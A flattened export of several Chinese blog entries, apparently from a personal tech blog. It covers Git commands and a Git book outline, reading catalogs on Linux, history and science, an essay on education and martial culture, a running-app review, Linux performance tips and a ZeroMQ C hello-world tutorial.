yourname@email_servergit config core.editor vimgit config core.paper "less -N"git config color.diff truegit var -l 查看已经设置的配置 Git 中的状态： HEAD 代表当前最新状态 tag 某个状态的标签 SHA1 每个提交的唯一标识 Git 中有四种对象,都由 SHA1 值表示, .git 目录中保存了全部信息。 blob 文件 tree 目录 commit 提交历史 tag 标签 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# 显示 file 在 HEAD 中的 SHA1 值git ls-tree HEAD file# 显示一个 SHA1 的类型git cat-file -t SHA1# 显示一个 SHA1 的内容git cat-file type SHA1## diffgit diff tag 比较tag和HEAD之间的不同git diff tag file 比较一个文件在两者之间的不同git diff tag1..tag2 比较两个tag之间的不同git diff SHA11..SHA12 比较两个提交之间的不同git diff tag1 tag2 file orgit diff tag1:file tag2:file 比较一个文件在两个tag之间的不同## loggit log file 查看一个文件的改动git log -p 查看日志和改动git log tag1..tag2 查看两个tag之间的日志git log -p tag1..tag2 file 查看一个文件在两个tag之间的不同git log tag.. 查看tag和HEAD之间的不同## add/delete/ls:git add -a 添加所有文件(除了.gitignore)git rm file 从git仓库中删除文件git commit 添加或是删除后要提交git ls-files -m 显示修改过的文件git ls-files 显示所有仓库中的文件## commitgit commit -a -e 提交全部修改文件，并调用vim编辑提交日志git reset HEAD^ orgit reset HEAD~1 撤销最后一次提交。git reset --hard HEAD^ 撤销最后一次提交并清除本地修改git reset SHA1 回到SHA1对应的提交状态。## patch:git format-patch -1 生成最后一个提交对应的patch文件。git am &lt; patch 把一个patch文件加入git仓库中。git am --resolved 如果有冲突，在解决冲突后执行。git am --skip 放弃当前git am所引入的patch。## conflict:git merge 用于合并两个分支。git diff 如果有冲突，直接使用diff查看，冲突代码用&lt;&lt;&lt;和&gt;&gt;&gt;表示。手动修改冲突代码。git update-index 更新修改后的文件状态。git commit -a -e 提交为解决冲突而修改的代码。## branch:git branch -a 查看所有分支。git branch new_branch 创建新的分支。git branch -d branch 删除分支。git checkout branch 切换当前分支。-f参数可以覆盖未提交内容。 技术出版选题一：Git主要思路：技术、工程实践、文化心理三者关系1.工具需要和工程实践结合，本身存在不同的应用范式2.每一种技术实现背后，除了操作手册，还有必要了解背后发明者的故事， 发明者的动机、哲学观会深入影响到技术实现。3.一项技术能够落地，还需要与自己所在组织的文化、心理契合 结果：电子工业出版社：2016 选题阶段枪毙 第一部分 玩转Git 引子1：如何搭建一个免费的博客？（类似：http://www.jianshu.com/p/fd878edb95e7 ）普遍性需求－&gt;抛出问题(内容版本、不仅仅是用于代码管理，建构个人知识库) 引子2：引入开源框架遇到问题怎么办？内容： http://www.jianshu.com/p/8addb7d0024f（开源社区的正确打开方式） 第2章 开启Git之旅 2.1 Git生态简介谁发明？ 谁在用？ 2.2 10分钟安装指南Install、First Commit、First Push部分回答引子的问题 2.4 Git客户端工具集 2.5 Git服务端工具集 第二部分 源码解读 第3章 数据结构 3.1 文件 3.2 库 3.3 分支 3.2 标签 第4章 核心动作 4.1 add 4.2 commit 4.3 push 4.4 merge （调用关系） 第5章 从0到1: Git源码演进 5.1 第一版Git什么样 第三部分 工程应用 第6章 到底要不要使用分支？ 6.1 个人开发者范式（最简单的入门应用范式） 6.2 单一产品团队范式 6.3 开源社区范式：以Linux开发模式为例 6.4 多项目团队范式 第7章 到底要不要分库？ 7.1 分库的一般原则 7.2 极客模式（参考资料：Google所有代码都在一个库） 第8章 权限控制问题企业应用的突出问题： Git为什么不支持代码分权分域？发明者：自由软件原教旨主义 &amp; 开源社区了解冲突、选型过程、企业适配 第四部分 附录《Linus Torvalds TED访谈实录：Linux和Git的故事》 （为什么会有Git,Git与Linux的渊源） Git源码解读 Git data model Repository Branch Merge Collaborate 可选论题：Git为什么不支持代码分权分域：作者是自由软件原教旨主义者；源于Linux开发模式 竞品分析 《Git团队协作》 扩展阅读：DevOps 漫谈系列 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 参考文献 git log – the Good Parts 为什么美术和策划在使用 git 时会遇到更多麻烦 | 云风的BlOG 《Understanding Git Conceptually》 Git内部原理 Git作者之一Scott Chacon的站点 (企业实践，包含代码治理有关内容)Python向来以慢著称，为啥Instagram却唯独钟爱它？]]></content>
      <tags>
        <tag>最佳工程实践</tag>
        <tag>DevOps</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Catalog:Linux 操作系统专题]]></title>
    <url>%2F2016%2F05%2F28%2FLinux%2F</url>
    <content type="text"><![CDATA[摘要 历史 技术：性能诊断、操作系统原理 运营管理 电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 一、历史1.1 操作系统待补充完善：例如，增加移动操作系统部分，Linux与Android的关系 1.2 Linux 简史 《Linus Torvalds:Just for Fun》 谁是王者：macOS vs Linux Kernels ？ 操作系统原理 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（三）：网络管理 三、运营管理 Linux.com:引入开源软件的六大运营挑战 软件工程实践中的十大法则 参考文献 池建强：《跨越边界》 图灵社区:《码农增刊·Linus与Linux》 LLVM for Grad Students]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>OpenSource</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[政府行为模型及预测：教育]]></title>
    <url>%2F2016%2F05%2F15%2FPolicy-Education%2F</url>
    <content type="text"><![CDATA[摘要待编辑 总有一些人，从不甘于现状，不想原地踏步，以挑战极限为己任。是他们不断拓宽着人类能力的边界，不断带领我们去往本来到不了的地方。他们清楚每次下潜都可能是最后一次，但仍随时准备出发。 他靠数学潜入千尺深渊，却没算中这结局 文艺复兴人（Renaissance Man） 指多才多艺的人。 “任何一种艺术，不管是否重要，如果你想要在该领域出类拔萃，就必须全身心投入。”—— 阿尔伯蒂（Leon Battista Alberti），在建筑、文学、艺术、宗教、密码学等领域都有重大建树。 QS排名 泰晤士排名 上海排名 ####（一）教育平权案例：清华大学拟降分录取贫困学生、江浙地区高考指标分配争议 ####（二）关于西式精英教育的发展和演变关键词：绵羊、精致的利己主义者 ####（三）是否存在中国基础教育优势？素材：BBC纪录片 ####（四）什么是最好的教育 参考文章：《绵羊》西方精英教育的蜕化 操作系统简史想到的林纳斯·本纳第克特·托瓦兹（Linus Torvalds） ：Just for Fun (自传)家族:统计学教授，在Minux上开发出来Linux 0.01 教育平权时事：清华大学 拟低分录取贫困地区学生。 如果我是计算机教授或者技术总监，第一节课肯定会要求学生或者小弟，第一个作业就是去采购一台苹果笔记本。但是教科书肯定不允许这么教，因为大多数人肯定承受不了诸如此类，很多事情。 穷文富武尚武精神才兼文武－关陇集团，人才观“穷文富武” 平民如何获得军事经验体制外：不考虑现有党国机器平民：非军警，无服役经历目的：有备无患，未雨绸缪 军事经验范畴（仅仅是个人理解，不是很全面）： 1.尚武精神（且融入家庭教育、国民教育的骨髓）2.一定的体能3.一定的技术（类似击剑、马术、射击、格斗等）4.组织系统：类似美帝的童子军系统、步枪协会、各类航空&amp;射击俱乐部等等 参考信息：实拍美国女孩射击训练 网友：这战力不服不行 本题目的方向也不是说民兵代替正规国防军那种，而是类似于美帝这种思路：即在和平时期，如何保持一定的战斗体能和尚武精神。视频中的小姑娘也不大可能去当大兵，她这种训练肯定也是家庭教育的一部分。 延展开来，如果对罗马帝国的历史稍加体会的话，不难理解欧美统治精英阶层，为什么花费大量精力投入到各类体育运动项目？除了文化、社交惯性，难道就没有一点制度设计考虑？ 松下幸之助力84岁排众议创办”政经塾”，二十几年而成日本精英的摇篮。除了学术理论，亦特别注重武士道精神的传承和训练，学员必须通过剑道和100公里以上长跑训练。在这样强悍的对手面前，我实在无法想象天朝那些大腹便便的“表哥、表叔”能有什么胜算。 百家争鸣时代虽有道、儒、法等门派区别，但基本上以礼、乐、射、御、书、数之六艺为基础，到汉武帝设五经博士，独尊儒，只留诗、书、礼、易、春秋，进而到后来的理学八股。礼乐、武备兵学、算学等一概不入主流，士阶层从此被培养成文弱巴结的犬儒，民风萎靡不堪，千年以降，今日亦不能自拔 汉墓出土佩剑统计图解 帝国初期往往彪悍，承平日久则耽于享受，晚期天下乱起，才勉强重拾武力，可惜已是积重难返。——统治精英或致力于其中者，不可不察也！ 如果佩剑数量反映的是当时社会的治安情况?诸侯王公都有卫队的，真要有事老板带家伙基本没用，贵族佩剑更多是一种荣誉，反映统治阶层的价值认同取向。5月2日 12:23一般社会治安的话，中晚期不可能好于早中期，流氓土匪山贼要么投军死于统一战争，要么都当官发财了，而且早期军备、保甲充实，刑法较严。中晚期以后，贵族一方面要控制日益庞大的庄园田产，一方面要对抗啸聚山林、四处冲击的流民，扩大私人武装应该是普遍的。这种就不能算一般的社会治安问题了，更接近于准战争状态。 西方军事教育基础教育部分和国民教育序列同步对接，高强度的基层历练，必须完成远高于现有军衔要求的进修才有可能晋升，全方位的岗位轮换，再加上不可能贪污受贿享受特权……这套东西太厉害了！！平时可以控制军队规模、提高技术含量，涵养高级人才，战时可以快速提拔、快速扩编。列强不愧是列强。 参考文章 “身无半亩心忧天下”。这是左文襄公23岁结婚之夜写的，虽有入赘之说，好歹也是州官烈士后代、世袭云骑尉好不；老师是退休的云贵总督，儿女亲家是两江总督，还未出山就可以结交魏源、林则徐……老左这个身无半亩的牛逼吹得有点大了. 教育资源论由于对医学和工程学等自然科学的重视，古巴经受住了1990年代苏联停止援助带来的影响。根据易货贸易协定，古巴向委内瑞拉派出了3万名医生，而委内瑞拉每天向古巴提供约10万桶石油。 人才鉴定论20160702事件人格缺陷、社交功能退化 扩展阅读 数据可视化（十）公共数据源列表 参考文献 纽约时报 | 硅谷时代，斯坦福比哈佛更受青睐 2016年全国教育事业发展统计公报 | 教育部，20170710 他带出一奥运冠军+2位世界冠军 体制变革经历阵痛——匈牙利击剑的“没落”之路 论文代写了解一下：要价63000美元的枪手论文是如何产生的？]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Education</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[玩转编程语言:编程技巧]]></title>
    <url>%2F2016%2F05%2F05%2FOpenSource-Coder%2F</url>
    <content type="text"><![CDATA[摘要 1.1 如何阅读源码？ 1.2 程序命名规范 一、如何阅读源码？1.1 阅读源码的一般流程 划分核心子系统（eg: Linux kernel 进程管理子系统、文件管理子系统） 分析主要数据结构 （结构体） 关键程序列表(加载顺序,调用关系call flow,消息传递路径，性能消耗） 主题式探索、带着目的分析实例（eg: Linux 支持闰秒吗？） 技能提高的秘诀：迫于需要的学习。 Problem Domain Model Arch &amp; Implement Improvement Best Practice 项目、框架和关键性概念 Architecture Key Concept —– 问题模型化、验证Demo —– —– 框架为应用而生：平衡技术实现、业务应用、项目 1.2 程序命名规范 The most important consistency rules are those that govern naming. The style of a name immediately informs us what sort of thing the named entity is: a type, a variable, a function, a constant, a macro, etc., without requiring us to search for the declaration of that entity. The pattern-matching engine in our brains relies a great deal on these naming rules. Naming rules are pretty arbitrary, but we feel that consistency is more important than individual preferences in this area, so regardless of whether you find them sensible or not, the rules are the rules. Google Code Style 笔记 - Simple Code Style 二、编程工具与开发自动化 API 文档神器 Swagger 介绍及在 PHP 项目中使用 | Leo108’s Blog 参考文献 张逸：代码的体格 张逸：高质量代码的特征 【翻译】设计线程安全的数据结构的几条准则 | 选自《C++ concurrency in action》chapter 6.2 The Universal Design Pattern | STEVE YEGGE KIRKLAND, WASHINGTON, US Tests Are About Design | Karl Seguin Software Craftsmanship: Testing | Karl Seguin 邱俊涛：如何成为一名优秀的程序员？ 邱俊涛：为什么优秀的程序员喜欢命令行关于重构 如何重构“箭头型”代码 | 酷壳 Catalog:Language,开发语言source:https://riboseyim.github.io/]]></content>
      <tags>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[香山艺术评论]]></title>
    <url>%2F2016%2F05%2F02%2FArtistic%2F</url>
    <content type="text"><![CDATA[摘要 诗歌 风月集|诗三百，思无邪 古典音乐 古典音乐低俗史 电影 电影评论|灵魂解码《林肯》 电影评论|斯皮尔伯格的林肯情怀 舞台剧 舞台剧：南海十三郎 小说 世纪小说《悲惨世界》红学 红楼故事：佩刀沽酒作长歌 摄影 BirdWatching:广州湿地公园观鸟 江南园林鉴赏|南京瞻园 摄影专辑|珠海航空航天展览 篆刻文士好石，精雕细刻，温润如玉；将军用铜，刀劈斧凿，雄强刚猛。– 2016-08-11 参考文献 韩高宗 黄章晋:女特务的中国进化史 韦芈:镀金上海 (京剧史)]]></content>
      <tags>
        <tag>Art</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Catalog:Nature&Science]]></title>
    <url>%2F2016%2F05%2F02%2FScience%2F</url>
    <content type="text"><![CDATA[摘要 一、选题：《神经生物学》（From Neuron to Brain FIFTH EDITION） 1.2 研究成果：嗑药简史：关于瘾品，成瘾机制及其历史|201709 一、选题：《神经生物学》（From Neuron to Brain FIFTH EDITION）1.1 立项时间：2016年初1.2 研究成果:嗑药简史：关于瘾品，成瘾机制及其历史|201709 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 行为成瘾：饮食、性行为、运动、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 1.3 研究成果:嗑药简史：扰动大国外交的China Girl 一、什么是芬太尼（Fentanyl）：从天使到魔鬼 二、大国外交的头等优先事项 三、预测：暗黑幽灵无国界 二、选题：《医学》1.1 立项时间：2017101.2 研究成果：肝系统健康状态评价指标体系参考文献 曹则贤研究员在2017年中科院物理所研究生开学典礼上的致辞]]></content>
      <tags>
        <tag>Science</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Catalog:History]]></title>
    <url>%2F2016%2F05%2F01%2FHistory%2F</url>
    <content type="text"><![CDATA[摘要 Map Resources 世界地图|1772年|清乾隆三十七年 亚洲地图|1808年|清嘉庆十三年 亚洲地图|1892年|清光绪十八年 世界地图|1914年|民国三年 世界地图·人口|1918年|民国六年 原创：《香山野史》 第一节：水客列传 第二节：病理解析群体暴力 第三节：武侠世界的三教九流 原创：《庆丰野史》读书笔记：世界史（一）古罗马史 《罗马帝国主义》 《罗马帝国衰亡史》 读书笔记：中国史（二）一、现代史 《陕西省公安史志》 二、民国史 《国士无双伍连德》（中国公共卫生先驱） 三、中共党史 高华系列|《红太阳是怎样升起的》 高华系列|Youtube 再探林彪事件 高华系列|Youtube 毛泽东何以发动文革 高华系列|Youtube 谈谈抗战历史的几个问题 高华系列|Youtube 有关红军长征研究的若干问题 顾准 湖南农民运动考察报告|（一九二七年三月）| 四、清史 清史-雍正时期：《大义觉迷录》 (通阅,201705) 清史-乾隆时期：《叫魂》 清史-嘉道咸时期：史景迁《太平天国》 清史-嘉道咸时期：张集馨《时晴斋主人自叙年谱》 清史-同治光绪时期：谭嗣同 五、明史 黄仁宇:《万历十五年》 黄仁宇:《放宽历史的视界》 黄仁宇:《明代的漕运》 文艺作品|小说《明朝那些事》 文艺作品|《大明王朝1956》：政府财政逻辑 明史：李自成 六、宋元史 国立台湾大学历史系：方震华Power Structures and Cultural Identities in Imperial China: Civil and Military Power from Late Tang to Early Song Dynasties (A.D.875-1063).Saarbrücken：VDM Verlag Dr. Müller, 2009.11. 七、唐史军事专题 国立台湾大学历史系：方震华 : 公开课《战争之外的军事史》 要点：府兵制（兵农合一）之发生、源流及证伪，破除迷信、大有裨益。 古人类 自闭症不仅造就天才，还可能左右了人类进化 | Time and Mind 论文推荐 | 2016-12-04 科研圈对细节的高度观察力（识别不同的植物或动物）和对体系优越的理解力（比如猎物的行为）和异于常人的专注度]]></content>
      <tags>
        <tag>History</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈:开源社区、产业与知识产权]]></title>
    <url>%2F2016%2F04%2F26%2FOpenSource%2F</url>
    <content type="text"><![CDATA[摘要 开源技术架构漫谈 开源社区与知识产权法 开源软件列表 开源社区 CNCF - 云原生计算基金会 知识产权法 Cyber-Security: 黑客与技术、产业及其精神世界 关于开源协议的法律问题（计划） Commounity Over Code Linus Torvalds: The mind behind Linux Github 分支 引入开源软件的六大运营挑战 开源软件列表 基于Kafka构建事件溯源型微服务 数据可视化（四）开源 GIS 技术简史 数据可视化（三）基于 Graphviz 实现程序化绘图 | 开源中国首页推荐·每日一博 基于LVS的AAA负载均衡架构实践 基于Ganglia实现服务集群性能态势感知 开源技术架构漫谈 基于Kafka构建事件溯源型微服务 基于Go语言快速构建一个RESTful API服务 数据可视化（三）基于 Graphviz 实现程序化绘图 SDN 技术指南（一）: 架构概览 SDN 技术指南（二）: OpenFlow 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 计算机远程通信协议：从 CORBA 到 gRPC 基于LVS的AAA负载均衡架构实践 基于Ganglia实现服务集群性能态势感知 Stack Overflow：云计算平台的趋势分析 Stack Overflow：2017年最赚钱的编程语言 Stack Overflow: The Architecture &amp; Hardware - 2016 Edition 参考文献 Node.js 是如何创建开源社区模式的 | InfoQ Twitter开源软件列表 | InfoQ 如何使用 Issue 管理软件项目？| 阮一峰]]></content>
      <tags>
        <tag>OpenSource</tag>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[战斗体能训练：跑步(Running)]]></title>
    <url>%2F2016%2F04%2F26%2FPHT-Running%2F</url>
    <content type="text"><![CDATA[摘要 跑步路线 跑步应用Nike+ Running与Garmin Mobile评测 美军体能训练观察 各国军队体能标准横向评测 参考文献]]></content>
      <tags>
        <tag>Sport</tag>
        <tag>讲武堂</tag>
        <tag>PHT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工具癖：如何提高日常生活效率]]></title>
    <url>%2F2016%2F04%2F26%2FTools%2F</url>
    <content type="text"><![CDATA[摘要场景：日常场景：创作场景：项目管理场景：论文 居家、旅行、行走江湖之必备 场景：日常 一般人的大部分思考过程都是杂乱无序的，没有逻辑的，最后也没法形成有效的沉淀，更无法找到清晰的结论。不是所有的人都是天生就有很好的逻辑的，但是逻辑是可以训练的，只要你懂的把自己的思维进行可视化的展示、分析和整理。 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（五）基于网络爬虫制作可视化图表 RSS OmniFouse （注意力是最稀缺资源） 邮件过滤器 场景：创作 最佳写作实践：从Evernote到Ulysses 我的写作工具链 场景：项目管理 Kanban 看板管理实践精要 基于Redmine的项目管理平台 场景：论文 Texture：一个优雅的开源学术论文书写工具 Classic Papers:谷歌学术推出“经典论文”排行 参考文献 推荐一些 Mac 上比较好用的软件 (力荐)scomper:OmniFocus 2 for Mac 的使用指南 Ariel Diaz:适合创业团队的必备工具栈]]></content>
      <tags>
        <tag>Mac</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 性能诊断高级课程]]></title>
    <url>%2F2016%2F04%2F26%2FLinux-Perf-Master%2F</url>
    <content type="text"><![CDATA[摘要 一、快捷方式 二、推荐书单 快捷方式12345678# 按内存排序，由大到小;rsz为实际内存ps -e -o &apos;pid,comm,args,pcpu,rsz,vsz,stime,user,uid&apos; | grep oracle | sort -nrk5# 查看打开的文件lsof# 查看 Threadsps m Linux 性能诊断：方法论 方法 信息收集 观测分析 统计分析 容量规划 调优 生命周期分析 实验分析 假设分析 街灯 Yes 随机变动 Yes 责怪他人 Yes Ad Hoc 核对清单法 Yes Yes 问题陈述法 Yes 科学法 Yes 循环诊断法 Yes 工具法 Yes USE法 Yes 工作负载特征归纳 Yes Yes 向下挖掘分析 Yes 延时分析 Yes R 方法 Yes 时间跟踪 Yes 基础线统计 Yes 性能监控 Yes Yes 排队论 Yes Yes 静态性能调整 Yes Yes 缓存调优 Yes Yes 微基准测试 Yes 容量规划 Yes Yes 推荐书单：操作系统性能优化电子书：《Linux Perf Master》主题以 Linux 性能为核心，覆盖评估诊断、监控、优化的工具和方法论及相关参考案例。GitBook 地址: https://www.gitbook.com/book/riboseyim/linux-perf-master/details 特色章节： 基于Linux单机的负载评估 Netflix性能分析模型 动态追踪技术：DTrace 基于Ganglia实现集群性能态势感知 新一代Ntopng网络流量监控—可视化和架构分析 基于LVS的AAA负载均衡架构实践 木马来袭：黑客入侵导致的性能问题 性能优化思路：从珠海航展交通管控实践谈起 读书笔记|《图解性能优化》 性能分析的基础:吞吐和响应的区别 实际系统中的性能分析 性能调优 &amp; 性能测试 虚拟化环境下的性能 云环境下的性能 《24小时365天不间断服务》《性能之巅》《Google核心技术》扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：启动 操作系统原理 | How Linux Works（二）：空间管理 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（三）：网络管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 Server-side I/O Performance: Node vs. PHP vs. Java vs. Go Linkedin:Real-time distributed tracing for website performance and efficiency optimizations 推荐书单 程序员需要跨过性能这个坎 | 原创 2017-07-13 池建强 MacTalk 望闻问切，解决Linux系统性能问题 | 2016-10-10 Brendan Gregg 开发资讯]]></content>
      <tags>
        <tag>最佳工程实践</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（二）跑步应用数据可视化评测]]></title>
    <url>%2F2016%2F04%2F26%2FVisualization-RunningApp%2F</url>
    <content type="text"><![CDATA[摘要 案例：跑步应用Nike+ Running 和 Garmin Mobile 评测 评估场景：跑步 评估时间：2016.02.22 评估说明：所有评测数据为作者真实体验测量，不针对特定厂家。 首发版（简书）：跑步应用Nike+ Running 和 Garmin Mobile 评测 |20160222 评估框架本次评估将以此为框架，逐一对比，双方都有的特性直接抵消忽略，不再讨论。核心子系统可概括为：硬件平台、跑步系统、数据分析系统、教练系统、荣誉系统、社交系统、其它支持。作为一款个人应用产品，社交系统是各厂追逐的王冠。 评估框架 竞争项目明细 主页系统 分析系统 Nike: 数据高度融合，无时无刻不突出变化、突出趋势 Garmin:数据离散、基本无融合，平铺直叙 (更正：20160513 v3.6 已实现心率、高度、步频叠加层) 社交应用基于庞大的消费群体、软件的低门槛，Nike+ Running的用户基数应该大很多（暂无统计数字支撑）。 日历系统：各有千秋 荣誉系统在这一单项中，Garmin的劣势非常明显，完全暴露的产品设计、运营能力的巨大短板。Nike+ Running则形成了非常完善的勋章系统，有利于提高用户粘性，为很多厂家所借鉴。包括但不限于： 里程：段位等级制（个人综合） 奖杯制 （每月，分为金、银、铜等） 积分：5K、10K、50K、100K等 连续性：1周3次、1周5次、连续3个月、连续6个月等 纪念性：周年、特殊节日、夜猫子、运动鞋、微博分享纪念等 荣誉系统－Nike+徽章体系 荣誉系统－Garmin徽章体系:能走点心吗？ 教练系统按照不同目标，可以推荐制定个人训练计划，并提供分析数据，不仅提高了趣味性，更体现了对入门级玩家的关怀。 硬件平台Garmin自有硬件平台,已经形成高低搭配的产品线，但是也限制了其APP兼容其他硬件厂家的可能性。Nike前几年尝试过内嵌跑鞋的传感器、TomTom贴牌代工的Sport Watch, 市场反馈看起来不好。几款产品目前都已停产，其战略完全转为纯软件路线：包括第一批支持Apple Watch,成为预置APP，全面支持Apple Health,支持TomTom、Garmin终端采集数据共享。 改进空间数据分析系统中，如果可以选择多次训练数据进行对比，应用的实用性和娱乐性会更强。甚至可以推荐相同“赛段”的历史数据对比。在户外运动场景，温度、湿度、风力、天气、气压的情况对成绩有较大影响。目前这两款应用都只做到记录当天的天气概况（晴、雨等），对于深度、活跃用户来说略显不足。第三点不足，基于众所周知的原因，或者大陆运营力量的不足，数据上传、售后服务皆有不稳定的情况。 结论 Nike+ Running： 系出豪门，设计感强，交互体验完胜； Garmin Connect Mobile : 自有硬件平台优势突出，设计体验凌乱，运营优待提升。 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 参考案例 共享单车APP评测 | 优恪]]></content>
      <tags>
        <tag>数据可视化</tag>
        <tag>架构师</tag>
        <tag>移动互联网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈：消息中间件(ZeroMQ)]]></title>
    <url>%2F2016%2F04%2F26%2FOpenSource-ZeroMQ%2F</url>
    <content type="text"><![CDATA[摘要 ZeroMQ (also known as ØMQ, 0MQ, or zmq) is an networking library, acts like a concurrency framework。https://github.com/zeromq-cn 缘起 first time I knew:Ntopng 发起人：Pieter HintjensiMatix公司首席执行官，制作游戏视频游戏起家。Wikidot公司前CEO。数字标准组织创始人。曾任FFII（自由信息基础设施基金会）会长，与软件专利斗争的大型NGO组织。会说英语、法语、荷兰语。生活在比利时布鲁塞尔，组织西非鼓乐队，喜欢旅行。一个C内核及C＋＋编写的核心库libzmq，50余种语言支持的绑定程序(例如Python支持PyZMQ)。由绑定程序的作者组成维护小组，iMatix公司持有商标，提供商业支持。 架构哲学零代理，零延迟，零管理，零成本，也代表贯穿项目的简约文化。软件的真正本质是人的本质，我们人类真的不善于理解复杂性，并且我们真的善于用合作来对大问题分而治之。我们是高度社会化的类人猿，有点聪明，但只在合适的人群中。 请把架构视为一个市场，而不是一个工程设计。－－《来自ZeroMQ的软件架构哲学》 Repository http://zeromq.org/ Application Ntopng:Packet Capturing and Network Traffic Monitor SaltStack:基础设施管理工具（Based Python） Apache SINGA:分布式深度学习平台 微软DMTK:机器学习框架，ZMQ是进程通讯之一（2015-11-16 开源） IPython Notebook既是一个交互计算平台，又是一个记录计算过程的「笔记本」。它由服务端和客户端两部分组成，其中服务端负责代码的解释与计算，而客户端负责与用户进行交互。服务端可以运行在本机也可以运行在远程服务器，包含负责运算的 IPython kernel (与 QT Console 的 kernel 相同) 以及一个 HTTP/S 服务器 (Tornado)。而客户端则是一个指向服务端地址的浏览器页面，负责接受用户的输入并负责渲染输出。http://ipython.org/notebook.html ABCHello ZeroMQ Install1234git clone --depth=1 https://github.com/imatix/zguide.git./configuremakemake install 编译依赖项libsodium-1.0.0 (zeromq-4.1.2) Github Issues:zmq-4.1.2 make failed as libsodium-1.0.8 sodium_init #1854 1234567cc1plus: warnings being treated as errorssrc/curve_client.cpp: In constructor'zmq::curve_client_t::curve_client_t(const zmq::options_t&amp;)':src/curve_client.cpp:61: warning: ignoring return value of 'int sodium_init()',declared with attribute warn_unused_result 12//C Project 添加库gcc -L/usr/local/lib -o "veto_mq_server" ./src/veto_mq_server.o -lzmq 可能的异常：库路径、名称错误 12345678910111213Undefined symbols for architecture x86_64:"_zmq_bind", referenced from:_main in veto_mq_server.o"_zmq_ctx_new", referenced from:_main in veto_mq_server.o"_zmq_recv", referenced from:_main in veto_mq_server.o"_zmq_send", referenced from:_main in veto_mq_server.o"_zmq_socket", referenced from:_main in veto_mq_server.old: symbol(s) not found for architecture x86_64 clang: error: linker command failed with exit code 1 (use -v to see invocation)** Client-Server Model123456789101112131415161718192021222324252627282930//server.c#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;#include &lt;zmq.h&gt;#include &lt;zmq_utils.h&gt;#include "veto_mq_utils.h"int main (void)&#123; // print_zmq_version(); // Socket to talk to clients void *context = zmq_ctx_new (); void *responder = zmq_socket (context, ZMQ_REP); int rc = zmq_bind (responder, "tcp://*:5555"); assert (rc == 0); while (1) &#123; char buffer [10]; zmq_recv (responder, buffer, 10, 0); printf ("Received Hello \n"); sleep (1); // Do some 'work' zmq_send (responder, "World", 5, 0); &#125; return 0;&#125; 1234567891011121314151617181920212223242526272829303132//client.c#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;zmq.h&gt;#include &lt;zmq_utils.h&gt;int main(void) &#123; printf ("Connecting to hello world server...\n"); void \*context = zmq_ctx_new (); void \*requester = zmq_socket (context, ZMQ_REQ); zmq_connect (requester, "tcp://localhost:5555"); int request_nbr; for (request_nbr = 0; request_nbr != 10; request_nbr++) &#123; char buffer [10]; printf ("Sending Hello %d...\n", request_nbr); zmq_send (requester, "Hello", 5, 0); zmq_recv (requester, buffer, 10, 0); printf ("Received World %d\n", request_nbr); &#125; zmq_close (requester); zmq_ctx_destroy (context); return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546MakefileSHELL = /bin/shprefix = /usr/localexec_prefix=$&#123;prefix&#125;srcdir = .sbindir = $&#123;exec_prefix&#125;/sbinlibdir = $&#123;exec_prefix&#125;/libsysconfdir = $&#123;prefix&#125;/etcSETUPDIR 